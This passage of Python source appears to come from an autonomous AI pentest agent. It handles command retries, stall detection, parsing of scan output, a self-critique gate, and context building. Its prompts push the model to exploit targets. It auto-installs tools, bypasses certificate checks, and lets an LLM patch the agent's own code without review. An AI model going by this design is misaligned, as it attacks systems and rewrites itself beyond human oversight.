            if "nmap" in command and "--max-rtt-timeout" not in command:
                fixed = f"{command} --max-rtt-timeout 500ms"
                print(f"{C.Y}[!] Timeout — retrying with faster timing{C.N}")
                new_result = self.exec.run(fixed, timeout=self._estimate_timeout(fixed) + 30)
                return fixed, new_result

        # Case 4: DNS resolution failed — try with different DNS
        if any(p in stderr for p in ["could not resolve", "cannot resolve", "name or service not known", "temporary failure in name resolution"]):
            print(f"{C.Y}[!] DNS failure — retrying with 8.8.8.8 resolver{C.N}")
            fixed = f" {command} "
            if "nmap" in fixed:
                fixed = fixed.replace("nmap ", "nmap --dns-servers 8.8.8.8 ")
            if "dig" in fixed:
                fixed = f"{command} @8.8.8.8"
            if "host" in command:
                fixed = f"{command} 8.8.8.8"
            if fixed != f" {command} ":
                new_result = self.exec.run(fixed.strip(), timeout=self._estimate_timeout(command))
                return fixed.strip(), new_result

        # Case 5: curl/wget connection issues
        if any(t in command for t in ["curl", "wget"]) and "resolve" not in stderr and "failed" in stderr:
            fixed = command
            if "curl" in command and "-k" not in command:
                fixed = command.replace("curl", "curl -k --connect-timeout 10")
            elif "wget" in command and "--no-check-certificate" not in command:
                fixed = command.replace("wget", "wget --no-check-certificate")
            if fixed != command:
                print(f"{C.Y}[!] Connection issue — retrying with SSL bypass{C.N}")
                new_result = self.exec.run(fixed, timeout=self._estimate_timeout(command))
                return fixed, new_result

        # Case 6: Go tools not found — try go install
        go_tools = ["subfinder", "httpx", "nuclei", "katana", "gau", "waybackurls", "unfurl", "assetfinder", "findomain", "dnx", "tlsx"]
        for gt in go_tools:
            if gt in command.split()[0] and "command not found" in stderr:
                install_cmd = f"go install -v github.com/projectdiscovery/{gt}/cmd/{gt}@latest 2>/dev/null || go install {gt}@latest 2>/dev/null"
                print(f"{C.Y}[!] Installing {gt} via go...{C.N}")
                try:
                    subprocess.run(install_cmd, shell=True, capture_output=True, text=False, timeout=120)
                    print(f"{C.G}[+] Retrying {gt}...{C.N}")
                    return command, self.exec.run(command, timeout=self._estimate_timeout(command))
                except Exception as e:
                    _swallow(e)

        # Case 7: Python tools not found
        py_tools = ["dirsearch", "jaeles", "testssl"]
        for pt in py_tools:
            if pt in command and "command not found" in stderr:
                install_cmd = f"pip install {pt} --user 2>/dev/null"
                print(f"{C.Y}[!] Installing {pt} via pip...{C.N}")
                try:
                    subprocess.run(install_cmd, shell=True, capture_output=True, text=False, timeout=120)
                    print(f"{C.G}[+] Retrying {pt}...{C.N}")
                    return command, self.exec.run(command, timeout=self._estimate_timeout(command))
                except Exception as e:
                    _swallow(e)

        return command, result

    # ===================== STUCK DETECTION =====================

    def _check_stuck(self) -> Optional[str]:
        """Return a stuck warning if output hasn't changed in 3 iterations."""
        if len(self._output_hashes) < 3:
            return None
        if self._output_hashes[-3:] == [self._output_hashes[-1]] * 3:
            self._stuck_warnings.append("LAST 3 OUTPUTS IDENTICAL — you are in a loop. PIVOT NOW.")
            return "[!] STUCK DETECTED: Last 3 command outputs are identical. You must pivot to a completely different technique. Do NOT repeat or rescan the same endpoint."
        return None

    def _check_recon_loop(self) -> Optional[str]:
        """Return a warning if stuck in recon without real findings."""
        recon_cats = {"port_scan", "dns_recon", "network", "subdomain_recon", "fingerprint", "web_dirbust", "web_scanner", "web"}
        recent_cats = []
        for c in self.session.data.get("commands", [])[-5:]:
            recent_cats.append(self._cmd_category(c.get("cmd", "")))
        has_real = any(
            (f.severity if isinstance(f, Finding) else f.get("severity", "info"))
            in ("critical", "high", "medium")
            for f in self.model.findings
        )
        # Surface saturation: plenty of attack surface already mapped but still doing recon.
        saturated = (len(self.model.endpoints) >= 40 or len(self.model.subdomains) >= 50)
        if saturated and not has_real and recent_cats[-2:] and all(c in recon_cats for c in recent_cats[-2:]):
            self._stuck_warnings.append("SURFACE SATURATED — stop recon, exploit ranked assets")
            return (f"[!] SURFACE SATURATED: {len(self.model.endpoints)} endpoints / {len(self.model.subdomains)} subdomains "
                    "already mapped. STOP recon. Pick the highest-scored ranked assets and exploit them now.")
        if len(recent_cats) < 4:
            return None
        if all(cat in recon_cats for cat in recent_cats):
            if not has_real:
                msg = "[!] RECON LOOP DETECTED: Last 5 commands were all recon. You MUST switch to exploitation or web testing NOW."
                self._stuck_warnings.append("RECON LOOP — forced pivot to exploitation")
                return msg
        return None

    # ===================== SEMANTIC OUTPUT ANALYZER =====================
    # ===================== SELF-CRITIQUE GATE =====================

    def _semantic_output_analysis(self, command: str, result, last_output: str = "") -> Dict[str, Any]:
        """Parse the last command's output SEMANTICALLY (not by hash) and produce
        a structured summary the AI can use to reason about what actually happened.
        Replaces blind pattern-matching with meaning-aware interpretation.

        Returns dict with keys: summary, discovered, blocked, saturated, tech_hints,
        endpoint_count, subdomain_count, redirect_targets.
        """
        analysis: Dict[str, Any] = {
            "summary": "",
            "discovered": [],      # NEW things found
            "blocked": [],         # what's preventing progress
            "saturated": [],       # signals that current technique is exhausted
            "tech_hints": [],      # tech stack fingerprints detected
            "endpoint_count": 0,
            "subdomain_count": 0,
            "redirect_targets": [],
            "http_status_seen": [],
        }
        text = (result.text if result and getattr(result, "text", None) else last_output) or ""
        if not text:
            analysis["summary"] = "no output to analyze"
            return analysis
        tl = text.lower()

        # --- Subdomain discovery / saturation ---
        m = re.search(r'(?:found|discovered|total[:\s]+)\s*(\d+)\s*subdomains?', tl)
        if m:
            n = int(m.group(1))
            analysis["subdomain_count"] = n
            if n == 0:
                analysis["saturated"].append("subdomain enumeration returned 0")
            else:
                analysis["discovered"].append(f"{n} subdomains found")
        # Also count subdomain-like lines (FQDN with target TLD) when output is a raw list
        if not m:
            fqdn_count = len(re.findall(r'^[a-z0-9][a-z0-9\-]*\.[a-z0-9][a-z0-9\-.]*\.[a-z]{2,}\s*$', text, re.MULTILINE))
            if fqdn_count >= 2:
                analysis["subdomain_count"] = fqdn_count
                analysis["discovered"].append(f"{fqdn_count} subdomains found")
        if re.search(r'\b0\s*new\s*(?:subdomains?|assets?|endpoints?)?\b', tl) or "no new subdomains" in tl:
            analysis["saturated"].append("0 new assets discovered — current technique saturated")

        # --- HTTP status code analysis ---
        codes = re.findall(r'http/[\d.]+\s+(\d{3})', tl)
        for line_match in re.finditer(r'<(?:HTTP/[\d.]+\s+)?(\d{3})>', text):
            codes.append(line_match.group(1))
        seen_codes = []
        for c in codes:
            try:
                seen_codes.append(int(c))
            except ValueError:
                pass
        if seen_codes:
            analysis["http_status_seen"] = sorted(set(seen_codes))
            blocked_codes = [c for c in seen_codes if c in (401, 403, 429, 503)]
            ok_codes = [c for c in seen_codes if 200 <= c < 300]
            if blocked_codes and not ok_codes:
                analysis["blocked"].append(f"all HTTP responses blocked: {sorted(set(blocked_codes))}")
            elif ok_codes:
                analysis["discovered"].append(f"HTTP 2xx received ({len(ok_codes)}x, codes {sorted(set(ok_codes))})")
            redirect_codes = [c for c in seen_codes if c in (301, 302, 303, 307, 308)]
            if redirect_codes:
                for loc in re.findall(r'location:\s*(\S+)', text, re.IGNORECASE):
                    analysis["redirect_targets"].append(loc[:200])
                analysis["discovered"].append(f"redirects observed: {sorted(set(redirect_codes))}")

        # --- WAF / CDN detection ---
        waf_signals = {
            "akamai":      ["akamai", "x-akamai", "ak_p", "akamai-cache-status"],
            "cloudflare":  ["cloudflare", "cf-ray", "cf-cache-status"],
            "sucuri":      ["sucuri", "x-sucuri"],
            "incapsula":   ["incapsula", "x-iinfo", "x-cdn"],
            "fastly":      ["fastly", "x-served-by", "x-fastly"],
            "aws_cloudfront": ["x-amz-cf-id", "via.*cloudfront", "x-amz-cf-pop"],
            "azure":       ["x-azure", "x-ms-request-id"],
            "f5_bigip":    ["bigip", "x-cnection"],
        }
        for cdn, sigs in waf_signals.items():
            if any(s in tl for s in sigs):
                analysis["blocked"].append(f"WAF/CDN detected: {cdn}")
                break

        # --- Tech stack hints ---
        tech_patterns = [
            ("nginx",         r"server:\s*nginx"),
            ("apache",        r"server:\s*apache[/\s]"),
            ("iis",           r"server:\s*Microsoft-IIS"),
            ("php",           r"x-powered-by:\s*PHP"),
            ("express",       r"x-powered-by:\s*Express"),
            ("tomcat",        r"(?:^|\W)(?:Apache-Coyote|Tomcat)"),
            ("wordpress",     r"wp-content|wp-includes|/wp-json/"),
            ("ghost",         r"ghost[\s/-]?(?:api|blog)"),
            ("cloudflare-warp",r"cf-warp"),
            ("next.js",       r"x-nextjs|nextjs|x-powered-by:\s*Next\.js"),
            ("django",        r"server:\s*WSGI|csrfmiddlewaretoken"),
            ("flask",         r"server:\s*Werkzeug"),
            ("spring",        r"x-application-context|^\s*Whitelabel"),
            ("aws_s3",        r"s3\.amazonaws\.com|x-amz-bucket"),
            ("github_pages",  r"x-github-request|x-served-by:\s*GH1"),
        ]
        for name, pat in tech_patterns:
            if re.search(pat, text, re.IGNORECASE | re.MULTILINE):
                analysis["tech_hints"].append(name)

        # --- Endpoint / path discovery (rough heuristic) ---
        paths = set(re.findall(r'(?:GET|POST|PUT|DELETE)\s+(/[^\s?#"<>]+)', text))
        paths.update(re.findall(r'(?:curl|httpx|gobuster|ffuf)[^\n]{0,100}?(\/[a-zA-Z0-9_\-/.]{3,200})', text))
        if len(paths) >= 3:
            analysis["endpoint_count"] = len(paths)
            analysis["discovered"].append(f"{len(paths)} unique endpoints/paths observed")

        # --- Reachability / port signals ---
        if re.search(r'0\s+hosts?\s+up|0\s+open\s+ports?|all\s+\d+\s+ports?\s+(?:closed|filtered)|not shown:\s*\d+\s+(?:closed|filtered)|failed to resolve| nxdomain| no such host', tl):
            analysis["blocked"].append("host unreachable / DNS failed / no open ports")
        if "connection refused" in tl or "connection timed out" in tl:
            analysis["blocked"].append("connection refused/timed out")
        if "permission denied" in tl and "tcp" in tl:
            analysis["blocked"].append("permission denied (need root or different approach)")

        # --- Saturation: lots of similar output / no new ---
        if re.search(r'\b(?:no\s+results?|nothing\s+found|no\s+matches|0\s+results?)\b', tl):
            analysis["saturated"].append("query returned no results")

        # --- Build one-line summary ---
        bits = []
        if analysis["discovered"]:
            bits.append("DISCOVERED=" + "; ".join(analysis["discovered"][:3]))
        if analysis["blocked"]:
            bits.append("BLOCKED=" + "; ".join(analysis["blocked"][:3]))
        if analysis["saturated"]:
            bits.append("SATURATED=" + "; ".join(analysis["saturated"][:3]))
        if analysis["tech_hints"]:
            bits.append("TECH=" + ",".join(analysis["tech_hints"][:5]))
        if analysis["redirect_targets"]:
            bits.append("REDIRECTS=" + "; ".join(analysis["redirect_targets"][:2]))
        if not bits:
            bits.append("no specific signals detected")
        analysis["summary"] = " | ".join(bits)

        # Cache the last analysis for _build_context retrieval
        self._last_semantic = analysis
        return analysis

    def _format_semantic_for_context(self) -> str:
        """Format the last semantic analysis as a context block for the AI."""
        a = getattr(self, "_last_semantic", None)
        if not a or not a.get("summary"):
            return ""
        lines = ["SEMANTIC ANALYSIS OF LAST OUTPUT (system-interpreted, trust this):"]
        lines.append(f"  Summary: {a['summary']}")
        if a.get("discovered"):
            lines.append("  DISCOVERED (real, exploitable signal):")
            for x in a["discovered"][:5]:
                lines.append(f"    + {x}")
        if a.get("blocked"):
            lines.append("  BLOCKED BY (do not repeat same approach):")
            for x in a["blocked"][:5]:
                lines.append(f"    x {x}")
        if a.get("saturated"):
            lines.append("  SATURATED (this technique is exhausted, MUST pivot):")
            for x in a["saturated"][:5]:
                lines.append(f"    - {x}")
        if a.get("tech_hints"):
            lines.append(f"  TECH HINTS: {', '.join(a['tech_hints'])}")
        if a.get("redirect_targets"):
            lines.append(f"  REDIRECTS: {', '.join(a['redirect_targets'][:3])}")
        return "\n".join(lines)

    def _self_critique_check(self, decision: Dict[str, Any]) -> Tuple[bool, str]:
        """Pre-execution gate: detect when the AI is template-filling rather than
        genuinely thinking. Returns (is_ok, reason). If not ok, the command
        should be blocked and the AI given the reason as feedback.

        Catches:
        - Same strategy 3 times in a row (no real change of plan)
        - Same tool family 3 times in a row
        - Reasoning text that is generic / templated
        - AI's "think" field is near-identical to the last 2 iterations
        - Same pivot_reason repeated 3 times
        """
        # Skip self-critique when in fallback mode (AI consistently failing)
        # Phased workflow deliberately uses same tool families — self-critique
        # would falsely block legitimate pentest commands.
        if getattr(self, "_ai_empty_streak", 0) >= 2:
            return True, "fallback mode"

        if not decision:
            return True, "no decision"
        command = (decision.get("next_command") or "").strip()
        if not command:
            return True, "no command (likely plan or finding)"

        # Pull recent AI decisions from session
        recent = []
        cmds = self.session.data.get("commands", [])
        for entry in cmds[-5:]:
            if isinstance(entry, dict):
                recent.append(entry)
        if len(recent) < 2:
            return True, "first iterations"

        # Check 1: tool family repetition
        try:
            cur_cat = self._cmd_category(command)
            recent_cats = [self._cmd_category(c.get("cmd", "")) for c in recent[-3:]]
            if recent_cats.count(cur_cat) >= 3:
                return False, (
                    f"tool family '{cur_cat}' used 3+ times in last 3 commands. "
                    f"Pick a tool from a DIFFERENT family (web_req|dns|subdomain|port|"
                    f"dirbust|web_scan|exploit|history|origin)."
                )
        except Exception:
            pass

        # Check 2: stored AI think texts are too similar (template filling)
        think_text = (decision.get("think") or decision.get("thinking") or "").strip()
        if think_text and len(think_text) >= 30:
            if not hasattr(self, "_recent_ai_thinks"):
                self._recent_ai_thinks = []
            self._recent_ai_thinks.append(think_text)
            self._recent_ai_thinks = self._recent_ai_thinks[-5:]
            if len(self._recent_ai_thinks) >= 3:
                from difflib import SequenceMatcher
                t0 = self._recent_ai_thinks[-1].lower()
                t1 = self._recent_ai_thinks[-2].lower()
                t2 = self._recent_ai_thinks[-3].lower()
                # Compare latest to each of the previous two
                r1 = SequenceMatcher(None, t0, t1).ratio()
                r2 = SequenceMatcher(None, t0, t2).ratio()
                # If very similar to BOTH, this is templated output
                if r1 > 0.78 and r2 > 0.78:
                    return False, (
                        f"your 'think' text is {int(max(r1, r2) * 100)}% similar to your "
                        f"last 2 iterations — you are template-filling, not reasoning. "
                        f"Write a genuinely different reflection: cite a SPECIFIC line "
                        f"from the last output, name the EXACT obstacle, and propose a "
                        f"fundamentally different angle."
                    )

        # Check 3: reasoning is too generic (template phrases)
        reasoning = (decision.get("reasoning") or "").strip()
        # Soft-check: warn about template-filling but don't block commands
        think_text_lower = (think_text or "").lower()
        reasoning_lower = reasoning.lower()
        combined = think_text_lower + " " + reasoning_lower

        template_patterns = [
            "we have exhausted", "we have no specific", "we have no findings",
            "we need to discover", "we need to move from", "previous attempts",
            "prior attempts", "must now pivot", "must now focus", "must now test",
            "we have no web", "no web findings",
        ]
        templated = any(re.search(p, combined) for p in template_patterns)
        generic_short = False
        if reasoning:
            generic = [
                "enumerate more", "scan further", "try again", "explore more",
                "discover more", "find more", "use a different", "do recon",
                "do more recon", "scan with", "i should",
                "let's try", "let me try", "we should", "now let's",
            ]
            rl = reasoning_lower
            generic_short = len(reasoning) < 60 and any(g in rl for g in generic)

        # Only hard-block if reasoning is EXTREMELY short (< 30 chars) or pure generic phrases
        hard_block = len(reasoning) < 30 and generic_short
        if hard_block:
            return False, (
                f"reasoning too generic/short: '{reasoning[:80]}'. "
                f"Name the specific tool, target, and expected evidence."
            )

        return True, "ok"

    def self_improve_cycle(self):
        """Learn from past failures — store as ChromaDB lessons to avoid repeats."""
        n = 0
        if self.learner:
            try:
                print(f"{C.Y}  [>] Researching web...{C.N}")
                n = self.learner.learn_now()
                if n:
                    print(f"{C.G}  [+] {n} new articles stored{C.N}")
                else:
                    print(f"{C.D}  [-] No new articles found{C.N}")
            except Exception as e:
                print(f"{C.Y}  [-] Research error: {e}{C.N}")
        else:
            print(f"{C.D}  [-] No learner available{C.N}")
        lessons = self._learn_from_failures()
        if lessons:
            print(f"{C.G}  [+] Failure analysis: {lessons} prevention lessons stored{C.N}")
        else:
            print(f"{C.D}  [~] No failures to analyze{C.N}")
        applied = 0
        if self._self_modify_enabled:
            try:
                applied = self._try_self_modify()
            except Exception as e:
                print(f"{C.Y}  [-] Self-modify error: {e}{C.N}")
        if applied:
            print(f"{C.G}  [+] Self-modification: {applied} patch(es) applied{C.N}")
        seeded = self._queue_autonomy_tasks(
            self.state_db._data.get("current_goal", {}).get("node", "assessment"),
            "self-improve cycle seeded fallback tasks",
        )
        if seeded:
            print(f"{C.G}  [+] Autonomy queue seeded with {seeded} task(s){C.N}")
        if n or lessons:
            print(f"{C.G}[Self-Improve] done{C.N}")
        else:
            print(f"{C.Y}[Self-Improve] Nothing new learned{C.N}")

    def _learn_from_failures(self) -> int:
        """Analyze FailureMemory, extract patterns, store lessons to avoid repeats."""
        stored = 0
        fails = self.failure_memory._data.get("failures", {})
        cats = self.failure_memory._data.get("categories", {})
        if not fails:
            return 0
        # Group failures by category
        by_cat = {}
        for cat, info in cats.items():
            by_cat[cat] = int(info.get("count", 0))
        # Find top failure categories
        top = sorted(by_cat.items(), key=lambda x: -x[1])[:5]
        today = datetime.now().strftime("%Y-%m-%d")
        for cat, count in top:
            lesson = f"Failure pattern: category '{cat}' failed {count} times. Avoid this approach unless conditions change."
            if self.memory.ready and self.memory.add("lessons", lesson, {
                "date": today, "timestamp": time.time(), "severity": "warning",
                "source": "failure_analysis", "category": cat, "failure_count": count,
            }):
                stored += 1
        # Find frequently failing command signatures
        sigs = sorted(fails.items(), key=lambda x: -int(x[1].get("count", 0)))[:5]
        for sig, info in sigs:
            cnt = int(info.get("count", 0))
            if cnt < 2:
                continue
            snippet = info.get("last_output_snippet", "")[:120]
            lesson = f"Command signature '{sig[:16]}' failed {cnt}x. Last error: {snippet}. Use different approach."
            if self.memory.ready and self.memory.add("lessons", lesson, {
                "date": today, "timestamp": time.time(), "severity": "warning",
                "source": "failure_analysis", "failure_count": cnt,
            }):
                stored += 1
        return stored

    def _try_self_modify(self) -> int:
        """Attempt LLM-proposed code patches based on performance bottlenecks."""
        bottlenecks = self.perf_analyzer.get_bottlenecks(n=3)
        if not bottlenecks:
            return 0
        perf_report = self.perf_analyzer.effectiveness_report()
        awareness_summary = self.self_awareness.summary()
        patches_applied = len([p for p in self.code_surgeon.patch_log if p.success])
        if patches_applied >= self.code_surgeon.max_patches_per_session:
            print(f"{C.Y}    Max patches ({patches_applied}) reached this session{C.N}")
            return 0
        applied = 0
        for b in bottlenecks:
            affected_func = ""
            source_excerpt = ""
            if b.area == "loop_detection":
                affected_func = "_check_stuck"
                src = self.self_awareness.get_function_source("_check_stuck")
                if src:
                    source_excerpt = src[:600]
            elif b.area == "tool_selection":
                affected_func = "_estimate_timeout"
                src = self.self_awareness.get_function_source("_estimate_timeout")
                if src:
                    source_excerpt = src[:600]
            elif b.area == "goal_planning":
                affected_func = "select_active_node"
                src = self.self_awareness.get_method_source("GoalTree", "select_active_node")
                if src:
                    source_excerpt = src[:600]
            prompt = f"""You are X19's self-improvement subsystem. Propose a minimal, safe code patch.

BOTTLENECK:
{b.observation}
Current value: {b.current_value:.2f}
Target: {b.target_value:.2f}
Area: {b.area}

AFFECTED FUNCTION: {affected_func}
SOURCE:
```python
{source_excerpt or 'Not available'}
```

PERFORMANCE REPORT:
{perf_report}

SELF-AWARENESS:
{awareness_summary}

Rules:
1. Change only MINIMUM code needed.
2. Never modify safety-critical code (BLOCKED, AUTH_ATTACK_PATTERNS, EXPLOIT_SUCCESS_PATTERNS, _validate_command).
3. The patch must compile and not break the main loop.
4. Add a comment "# SELF-IMPROVEMENT: {datetime.now().strftime('%Y-%m-%d')}" to changed code.

Respond with JSON only:
{{
  "description": "what this patch does",
  "patch_type": "modify"|"add_function"|"add_tool",
  "target_function": "{affected_func}",
  "original_code": "exact existing code to replace",
  "new_code": "replacement code",
  "validation_hint": "how to test",
  "risk": "low"|"medium"|"high"
}}"""
            resp = self.ai.chat("You generate safe, minimal Python patches.", prompt)
            if not resp:
                continue
            try:
                m = re.search(r'\{.*"description".*\}', resp, re.DOTALL)
                if m:
                    patch_data = json.loads(m.group(0))
                    patch_data["patch_type"] = patch_data.get("patch_type", "modify")
                    patch_data["risk"] = patch_data.get("risk", "low")
                    step = {"action": "self_modify", "patch": patch_data, "label": patch_data.get("description", "")[:80]}
                    self.execute_plan({"steps": [step]})
                    applied += 1
            except (json.JSONDecodeError, KeyError) as e:
                print(f"{C.Y}    Failed to parse patch: {e}{C.N}")
        return applied

    def _build_context(self, target: str, last_output: str) -> str:
        model = self.model
        cmd_hist = self.session.data.get("commands", [])
        fast = is_fast_mode()
        out_limit = 1200 if fast else 2000
        hist_n = 8 if fast else 12
        sub_n = 12 if fast else 15
        ep_n = 10 if fast else 12

        # Reachability hint — let AI know if target is dead / filtered
        reachable_hint = ""
        if model.ports and not any(p.get("state") == "open" for p in model.ports):
            all_filtered = all(p.get("state") in ("filtered", "closed") for p in model.ports)
            nmap_runs = sum(1 for c in cmd_hist if c.get("cmd", "").startswith("nmap "))
            if all_filtered and nmap_runs >= 1:
                reachable_hint = (
                    f"\n!!! TARGET REACHABILITY: {nmap_runs} nmap scan(s) completed. "
                    "ALL ports are filtered/closed (firewall dropping or host down). "
                    "STOP running nmap/masscan — they will not help. "
                    "Try ALTERNATIVE recon angles instead:\n"
                    "  1) ICMP ping: ping -c 3 <target>   (is host alive?)\n"
                    "  2) HTTP probe on common ports: curl -sik --max-time 5 http://<target>:<port>/  (try 80, 8080, 8443, 8000, 3000)\n"
                    "  3) DNS reverse: dig +short -x <target>   (is it even a public IP?)\n"
                    "  4) WHOIS: whois <target>   (owner, network range)\n"
                    "  5) OSINT: any subdomain? any leaked credentials? any GitHub repo?\n"
                    "  6) Different protocol: if web tools fail, try UDP scan (nmap -sU --top-ports 20)\n"
                    "If 2 different recon angles also fail, set completed:true — this target is unreachable from your network.\n"
                )
            elif all_filtered:
                reachable_hint = (
                    "\n!!! REACHABILITY HINT: All discovered ports are filtered/closed. "
                    "Target is either behind a firewall dropping packets, OR down. "
                    "Try: (a) ICMP ping first, (b) HTTP/HTTPS probe on common web ports, "
                    "(c) alternative recon like DNS/whois.\n"
                )

        # Anti-loop feedback
        stuck_msg = self._check_stuck()
        recon_loop_msg = self._check_recon_loop()
        svc_limit_reached = [f"{k}({v})" for k, v in self._service_iters.items() if v >= 3]
        anti_loop = []
        if stuck_msg:
            anti_loop.append(stuck_msg)
        if recon_loop_msg:
            anti_loop.append(recon_loop_msg)
        if self._stuck_warnings:
            for w in self._stuck_warnings[-3:]:
                anti_loop.append(f"[!] {w}")
        if svc_limit_reached:
            anti_loop.append(f"[!] SERVICE ITERATION LIMITS: {', '.join(svc_limit_reached)} — pivot to a different service category.")

        bb_note = ""
        if is_bug_bounty_mode() or fast:
            bb_note = (
                "\nFAST/BOUNTY: Bootstrap done. Use multi-step plans with parallel run steps. "
                "Web tools first. Decide quickly — JSON only.\n"
            )

        memory_counts = {
            "techniques": self.memory.count("techniques") if self.memory.ready else 0,
            "lessons": self.memory.count("lessons") if self.memory.ready else 0,
            "conversations": self.memory.count("conversations") if self.memory.ready else 0,
            "profile": self.memory.count("profile") if self.memory.ready else 0,
        }
        autonomy_ctx = self.autonomy_profile.observe(
            target=target,
            target_type=self.target_type,
            model=model,
            goal_node=self.state_db._data.get("current_goal", {}).get("node", "assessment"),
            loop_sig=self._loop_sig,
            failure_memory=self.failure_memory,
            memory_ready=self.memory.ready,
            memory_counts=memory_counts,
            self_summary=self.self_awareness.summary(),
            perf_summary=self.perf_analyzer.effectiveness_report(),
            last_output=last_output,
        )
        task_ctx = self.mission_manager.summary()

        # Decision signals: enrich the goal with its description + a confidence score for the
        # current line of attack (wires ConfidenceScorer.score_action into the AI's context).
        node = self.state_db._data.get('current_goal', {}).get('node', 'assessment')
        gnode = self.goal_tree.nodes.get(node)
        goal_desc = f"{node} ({gnode.kind}) — {gnode.description}" if gnode else node
        act_cat = self._last_service_category if self._last_service_category not in ("", "init") else "recon"
        act_conf = self.confidence_scorer.score_action(act_cat, model, self.failure_memory)
        conf_hint = "" if act_conf >= 0.6 else " — LOW: consider a different category/technique"

        ctx = f"""TARGET: {target}
TARGET_TYPE: {self.target_type}
ACTIVE GOAL: {goal_desc}
ACTION CONFIDENCE [{act_cat}]: {act_conf:.2f}{conf_hint}
{bb_note}
{reachable_hint}
SESSION INSTRUCTIONS: {self._session_instructions or 'None — follow standard methodology'}
TARGET MODEL SUMMARY:
{model.summary()}

{autonomy_ctx}
{task_ctx}
STATE: iters={len(cmd_hist)} findings={len(model.findings)} forced_exploit={self._forced_exploit} poc={self._poc_mode}
EXPLOIT FOCUS: {self._current_focus_finding or "none"} (depth: {self._exploit_depth}/{self._depth_minimum})
OPEN PORTS: {model.service_summary()[:500]}
WEB PORT: {self._get_web_port() or 'not yet discovered — fallback to 80/443'}
"""
        scope_tools = self._scope_tool_suggestions()
        if scope_tools:
            ctx += scope_tools + "\n"
        caps = self._capabilities_context()
        if caps:
            ctx += caps + "\n"
        meth = self._methodology_context()
        if meth:
            ctx += meth + "\n"
        chain = self.planner.chain_context(self.model)
        if chain:
            ctx += chain + "\n"
        cve_block = self._cve_context_block()
        if cve_block:
            ctx += cve_block + "\n"
        tool_fails = self._tool_failure_context()
        if tool_fails:
            ctx += tool_fails + "\n"
        outcomes = self._session_outcomes_context()
        if outcomes:
            ctx += outcomes + "\n"
        anti_patterns = self._anti_pattern_context()
        if anti_patterns:
            ctx += anti_patterns + "\n"
        false_claims = self._false_claim_context()
        if false_claims:
            ctx += false_claims + "\n"
        lessons = self._lessons_context()
        if lessons:
            ctx += lessons + "\n"
        hints = self._install_hints_context()
        if hints:
            ctx += hints + "\n"
        # MCP tools context
        mcp_ctx = self.mcp.tools_context_block()
        if mcp_ctx:
            ctx += mcp_ctx + "\n"
        # Plugin hooks: on_context_build
        plugin_ctx = self.plugins.call_hook_filter("on_context_build", self, ctx)
        if plugin_ctx:
            ctx += str(plugin_ctx) + "\n"
        templates = self._command_templates_context()
        if templates:
            ctx += templates + "\n"
        if not fast:
            ctx += f"""
- Auth attacks blocked: {self._auth_attack_blocked}
- Recon streak: {self._recon_no_progress_count}
PERFORMANCE: {self.perf_analyzer.effectiveness_report()}
WORKSPACE: {self._file_state(target)[:400]}
"""
        if model.os_info:
            ctx += f"\nOS: {model.os_info[:150]}\n"

        if model.subdomains:
            ctx += f"\nSUBDOMAINS ({len(model.subdomains)}):\n"
            for s in sorted(model.subdomains)[:sub_n]:
                ctx += f"  {s}\n"

        if model.tech_stack:
            ctx += "\nTECH STACK:\n"
            for name, ver in list(model.tech_stack.items())[:8 if fast else 10]:
                ctx += f"  {name}: {ver}\n" if ver else f"  {name}\n"

        if model.credentials and not fast:
            ctx += "\nCREDENTIALS FOUND:\n"
            for c in model.credentials:
                ctx += f"  {c['service']}: {c['username']}:{c['password']}\n"

        if model.endpoints:
            ctx += f"\nENDPOINTS ({len(model.endpoints)}):\n"
            for e in model.endpoints[-ep_n:]:
                ctx += f"  {e['method']:6} {e['url'][:120]}\n"

        if model.attack_paths:
            ctx += "\nATTACK PATHS:\n"
            for a in model.attack_paths:
                status = "[x]" if a["attempted"] else "[ ]"
                ctx += f"  {status} {a['service']}: {a['technique']} — {a['rationale'][:100]}\n"

        if model.findings:
            ctx += "\nFINDINGS:\n"
            for f in model.findings[-15:]:
                ctx += f"  [{f.severity.upper():8}] {f.title}\n"
        expl_ctx = self._exploitation_context()
        if expl_ctx:
            ctx += expl_ctx + "\n"
        auth_ctx = self._auth_context()
        if auth_ctx:
            ctx += auth_ctx + "\n"
        pf_ctx = self._param_fuzzing_context(target)
        if pf_ctx:
            ctx += pf_ctx + "\n"
        js_ctx = self._js_analysis_context(target)
        if js_ctx:
            ctx += js_ctx + "\n"

        # Recent full outputs available for analysis
        if model.command_outputs:
            ctx += f"\nSTORED COMMAND OUTPUTS: {len(model.command_outputs)} available. Reference by cmd_id (e.g., cmd_0, cmd_1) in your commands."
            # Show recent output IDs and first commands
            recent_ids = sorted(model.command_outputs.keys(), key=lambda k: model.command_outputs[k].get("timestamp", ""), reverse=True)[:5]
            ctx += "\nRecent: " + ", ".join(f"{oid}: {model.command_outputs[oid]['command'][:60]}" for oid in recent_ids) + "\n"
            # Show last full output in full (no truncation)
            if recent_ids:
                last = model.command_outputs[recent_ids[0]]
                ctx += f"\n=== LAST OUTPUT: {last['command'][:100]} ===\n"
                ctx += (last.get("stdout", "") + last.get("stderr", ""))[:out_limit]
                ctx += "\n=== END ===\n"

        if last_output and not model.command_outputs:
            ctx += f"\nLAST COMMAND OUTPUT:\n{last_output[:out_limit]}\n"

        if self._last_reflection:
            ctx += f"\nSELF-REFLECTION ON LAST COMMAND:\n{self._last_reflection}\n"

        if self._research_log:
            ctx += "\nRESEARCH LOG (recent hypothesis/result/lesson):\n"
            for entry in self._research_log[-5:]:
                ctx += f"  H: {entry['hypothesis'][:80]}\n  R: {entry['result']} | L: {entry['lesson'][:80]}\n"

        recent = cmd_hist[-hist_n:]
        if recent:
            ctx += "\nRECENT COMMANDS:\n"
            for c in recent:
                cmd = c['cmd'][:100]
                stat = c.get("status", "")
                if stat in ("blocked", "error"):
                    cmd += f" [{stat}]"
                ctx += f"  {cmd}\n"

        # De-duplicated "tools already tried" hint so AI stops repeating
        tried = {}
        for c in cmd_hist:
            cstr = c.get("cmd", "")
            tool = (cstr.strip().split() or [""])[0].lower() if cstr else ""
            if tool:
                tried[tool] = tried.get(tool, 0) + 1
        if tried:
            top_tried = sorted(tried.items(), key=lambda x: -x[1])[:6]
            tried_line = ", ".join(f"{t}={n}" for t, n in top_tried)
            ctx += f"\nTOOLS ALREADY TRIED (counts): {tried_line}\n"
            # Strong hint: if same tool used 2+ times, don't repeat it
            repeated = [t for t, n in top_tried if n >= 2]
            if repeated:
                ctx += f"!!! DO NOT REPEAT: {', '.join(repeated)} — switch to a different tool family.\n"

        # FORBIDDEN section — aggregate all blocks into one prominent list
        forbidden = []
        if self._banned_categories:
